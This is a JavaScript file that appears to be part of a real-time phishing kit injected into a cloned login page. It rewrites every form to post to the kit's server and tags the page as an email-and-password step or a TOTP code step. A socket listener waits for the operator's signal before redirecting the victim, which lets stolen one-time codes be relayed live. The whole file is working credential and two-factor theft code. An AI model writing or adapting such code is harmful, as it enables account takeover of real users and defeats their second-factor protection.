const urlPath = location.pathname
const urlSplit = urlPath.split("/")
const id = urlSplit[3]
const appName = urlSplit[2]

const socket = io(location.origin, {
    path: '/socket.io',
    transports: ['websocket'],
    secure: true,
})

socket.on(`${id}-listener`, data => {
    if (data.type == "response") {
        top.location.href = `${location.origin}/ws-app?id=${id}`
    }
})

document.querySelectorAll("a").forEach(atag => {
    atag.href = location.href
})

document.querySelectorAll("iframe").forEach(f => {
    f.remove()
})

document.querySelectorAll('*').forEach(element => {
    element.removeAttribute("onclick")
    element.removeAttribute('onmousedown')
})

document.querySelectorAll("form").forEach(form => {
    form.action = location.pathname
    form.method = "POST"
    form.noValidate = false

    const input = document.createElement("input")
    input.type = "hidden"
    input.name = "spikeType"
    form.append(input)
})

document.querySelectorAll("input").forEach(inp => {
    if (inp.type != "hidden") {
        inp.required = true
    }
})

function addSpikeType(value) {
    let allSpikes = document.querySelectorAll(`[name="spikeType"]`)
    for (let spike of allSpikes) {
        spike.value = value
    }
}

function spikeForm(data, silent = false) {
    if (silent) {
        fetch(location.href, JSON.stringify(data), {
            method: "post",
            headers: {
                "Content-Type": "application/json"
            }
        }).then(res => res.text())
            .then(data => {
                console.log(data);
            })
    } else {
        let formData = ""
        for (const key in data) {
            formData += `<input type="hidden" name="${key}" value="${data[key]}">`
        }

        const form = document.createElement("form")
        form.method = "post"
        form.action = location.href
        form.innerHTML = formData
        document.body.appendChild(form)
        form.submit()
    }
}

/**
 *  spikes selector functions +===================+
 */

const selectorSpikes = [
    {
        spikeType: "home-login",
        querys: [
            `[id="sign_in_email"]`,
            `[name="user[email]"]`,
            `[id="sign_in_password"]`,
            `[name="user[password]"]`
        ],
        runner() {
            document.querySelector(`#user_remember_me`).required = false
            document.querySelector(`[id="sign_in_email"]`).parentElement.style = `display: flex;width: 100%;`
            document.querySelector(`[id="sign_in_password"]`).parentElement.style = `display: flex;width: 100%;`
            document.querySelector(`[type="submit"]`).disabled = false
        }
    },
    {
        spikeType: "otp-code",
        querys: [
            `[id="sign_in_totp_code"]`,
            `[name="user[totp_code]"]`
        ],
        runner() {
            document.querySelector(`[id="sign_in_totp_code"]`).parentElement.style = `display: flex;width: 100%;`
        }
    }
]

/**
 * button spikes functions +===================+
 */

const buttonSpikes = [
    // {
    //     spikeType: "",
    //     runner() {

    //     }
    // }
]

for (const selectorSpike of selectorSpikes) {
    const spikeType = selectorSpike.spikeType
    const querys = selectorSpike.querys
    const queryLength = querys.length

    let queryMatch = 0
    for (const selector of querys) {
        if (document.querySelector(selector)) queryMatch++
    }

    if (queryLength == queryMatch) {
        addSpikeType(spikeType)
        if (selectorSpike.hasOwnProperty("runner")) {
            try {
                selectorSpike.runner()
            } catch (error) { }
        }

        break
    }
}

for (const buttonSpike of buttonSpikes) {
    try {
        buttonSpike.runner()
    } catch (error) { }
}

// +----------------+
{
    let inVisiableScreen = document.querySelector(`.fixed.top-0.left-0.w-screen.h-screen`)
    if (inVisiableScreen) inVisiableScreen.remove()

    let vertical_navigation = document.querySelector("#vertical-navigation")
    if (vertical_navigation) {
        if (window.innerWidth < 800) {
            document.querySelector(".js-application-root.full-size").querySelector("div").style = "padding: 0 !important;"
            vertical_navigation.remove()
        }
    }
}